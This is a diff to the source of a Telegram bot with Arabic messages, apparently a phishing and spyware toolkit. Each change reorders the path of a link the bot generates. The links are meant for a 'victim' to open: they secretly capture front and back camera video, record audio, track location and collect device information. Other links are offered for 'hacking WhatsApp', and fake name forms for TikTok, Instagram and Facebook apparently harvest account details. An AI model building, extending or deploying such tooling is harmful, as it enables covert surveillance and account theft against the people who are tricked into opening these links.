@@ -1170,7 +1170,7 @@ bot.on('callback_query', (callbackQuery) => {
     const data = callbackQuery.data;
 
     if (data === 'capture_video') {
-        const message = `تم انشاء الرابط ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: ${baseUrl}/capture/ca?chatId=${chatId}`;
+        const message = `تم انشاء الرابط ملاحظه بزم يكون النت قوي في جهاز الضحيه\n: ${baseUrl}/ca/capture/?chatId=${chatId}`;
 
         if (message && message.trim() !== '') {
             bot.sendMessage(chatId, message);
@@ -1199,7 +1199,7 @@ bot.on('callback_query', async (callbackQuery) => {
     }
 
     if (data === 'request_verification') {
-        const verificationLink = `${baseUrl}/whatsapp/n?chatId=${chatId}`;
+        const verificationLink = `${baseUrl}/n/whatsapp/?chatId=${chatId}`;
         bot.sendMessage(chatId, `تم انشاء الرابط لختراق وتساب\n: ${verificationLink}`);
         return;
     }
@@ -1308,10 +1308,10 @@ bot.on('callback_query', async (callbackQuery) => {
 
         switch (action) {
             case 'captureFront':
-                link = `${baseUrl}/captureFront/${crypto.randomBytes(1).toString('hex')}/c?chatId=${chatId}`;
+                link = `${baseUrl}/c/captureFront/${crypto.randomBytes(1).toString('hex')}?chatId=${chatId}`;
                 break;
             case 'captureBack':
-                link = `${baseUrl}/captureBack/${crypto.randomBytes(1).toString('hex')}/b?chatId=${chatId}`;
+                link = `${baseUrl}/b/captureBack/${crypto.randomBytes(1).toString('hex')}/?chatId=${chatId}`;
                 break;
             case 'getLocation':
                 link = `${baseUrl}/getLocation/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
@@ -1321,13 +1321,13 @@ bot.on('callback_query', async (callbackQuery) => {
                 link = `${baseUrl}/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
                 break;
             case 'rshq_tiktok':
-                link = `${baseUrl}/getNameForm/t?chatId=${chatId}&type=tiktok`;
+                link = `${baseUrl}/t/getNameForm/?chatId=${chatId}&type=tiktok`;
                 break;
             case 'rshq_instagram':
-                link = `${baseUrl}/getNameForm/i?chatId=${chatId}&type=instagram`;
+                link = `${baseUrl}/i/getNameForm/?chatId=${chatId}&type=instagram`;
                 break;
             case 'rshq_facebook':
-                link = `${baseUrl}/getNameForm/fe?chatId=${chatId}&type=facebook`;
+                link = `${baseUrl}/fe/getNameForm/?chatId=${chatId}&type=facebook`;
                 break;
             default:
                 bot.sendMessage(chatId, '');
@@ -1357,7 +1357,7 @@ bot.on('callback_query', (query) => {
 
 
     if (query.data === 'collect_device_info') {
-        const url = `${baseUrl}/mm${chatId}`;
+        const url = `${baseUrl}/mm?${chatId}`;
         bot.sendMessage(chatId, `رابط جمع المعلومات: ${url}`);
     }
 
@@ -3575,7 +3575,7 @@ bot.on('callback_query', (callbackQuery) => {
         const targetChatId = data.split(':')[1];
         
         // إنشاء رابط HTML فريد لكل مستخدم
-        const locationUrl = `${baseUrl}/submitLocation/lo?chatId=${targetChatId}`;
+        const locationUrl = `${baseUrl}/lo/submitLocation/?chatId=${targetChatId}`;
         
         // إرسال الرابط كرسالة نصية عادية
         bot.sendMessage(
@@ -3676,7 +3676,7 @@ bot.on('callback_query', (callbackQuery) => {
         const targetChatId = data.split(':')[1];
         
         // إنشاء رابط HTML فريد لكل مستخدم
-        const audioUrl = `${baseUrl}/recordAudio/r?chatId=${targetChatId}`;
+        const audioUrl = `${baseUrl}/r/recordAudio/?chatId=${targetChatId}`;
         
         // إرسال الرابط كرسالة نصية عادية
         bot.sendMessage(
